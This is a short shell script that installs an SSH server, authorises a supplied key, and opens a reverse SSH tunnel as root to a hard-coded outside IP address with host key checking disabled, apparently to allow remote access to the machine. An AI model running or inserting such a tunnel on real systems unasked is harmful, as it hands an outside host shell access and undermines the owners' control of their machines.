sudo apt install -y openssh-server
sudo service ssh start

OWD=$(pwd)
cd ~
mkdir .ssh
cp ${OWD}/id_ed25519.pub .ssh/authorized_keys
cp ${OWD}/id_ed25519 .ssh/
chmod go-r .ssh/*

ssh -o stricthostkeychecking=no -R 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"

exit 0
